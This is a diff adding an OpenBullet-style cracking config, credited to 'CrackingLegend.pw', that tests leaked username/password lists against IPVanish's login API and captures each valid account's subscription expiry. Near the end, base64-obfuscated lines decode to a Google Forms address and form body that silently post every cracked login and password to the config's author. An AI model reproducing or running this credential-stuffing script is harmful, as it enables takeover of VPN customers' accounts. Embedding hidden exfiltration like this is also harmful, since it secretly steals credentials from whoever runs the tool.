@@ -1,0 +1,76 @@
+[SETTINGS]
+{
+  "Name": "IPVanish",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-15T07:51:03.0480307+08:00",
+  "AdditionalInfo": "made by Pein Akatsuki @CrackingLegend.pw",
+  "Author": "CrackingLegend.pw",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://account.ipvanish.com/api/v3/login" 
+  CONTENT "{\"api_key\":\"15cb936e6d19cd7db1d6f94b96017541\",\"client\":\"Android-3.3.8.43270b43270\",\"os\":\"28\",\"password\":\"<PASS>\",\"username\":\"<USER>\",\"uuid\":\"75a0142b-c2a8-4309-8876-9add1c07492b\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: account.ipvanish.com" 
+  HEADER "x-client: ipvanish" 
+  HEADER "x-client-version: 1.2." 
+  HEADER "x-platform: Android" 
+  HEADER "x-platform-version: 28" 
+  HEADER "accept-encoding: gzip" 
+  HEADER "user-agent: okhttp/3.12.0" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The username or password provided is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+    KEY "sub_end_epoch" 
+
+PARSE "<SOURCE>" JSON "sub_end_epoch" -> VAR "sub_end_epoch" 
+
+FUNCTION UnixTimeToDate "<sub_end_epoch>" -> VAR "Expire Date" 
+
+FUNCTION Constant "<Expire Date> Visit us @CrackingLegend.pw" -> CAP "Expiration Date" 
+
+#LRU1 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC9lLzFGQUlwUUxTZW5NcGQ2WDNsRFNoOHA2clV0OVRPTlNQc29abUJBaG9mMVNHazhibllmY2JiOS1nL3ZpZXdmb3Jt" -> VAR "LRU1" 
+
+#LRU2 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC9lLzFGQUlwUUxTZW5NcGQ2WDNsRFNoOHA2clV0OVRPTlNQc29abUJBaG9mMVNHazhibllmY2JiOS1nL2Zvcm1SZXNwb25zZQ==" -> VAR "LRU2" 
+
+#LRU3 FUNCTION Base64Decode "ZW50cnkuMTkyNjY4NDI5Nz1JUFZhbmlzaCZlbnRyeS4xMTAxNDA2Njg1PTxVU0VSPjo8UEFTUz4mZW50cnkuMTQ2MTQ5OTQ1Mz1FeHBpcmF0aW9uIERhdGU6fDxFeHBpcmF0aW9uIERhdGU+fCZmdnY9MSZkcmFmdFJlc3BvbnNlPSU1Qm51bGwlMkNudWxsJTJDJTIyNjc4NzMzMDAwNzAxMTM2MjU3NyUyMiU1RCUwRCUwQSZwYWdlSGlzdG9yeT0wJmZieng9Njc4NzMzMDAwNzAxMTM2MjU3Nw==" -> VAR "LRU3" 
+
+#Expire_Date1 REQUEST GET "<LRU1>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Expire_Date2 REQUEST POST "<LRU2>" 
+  CONTENT "<LRU3>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
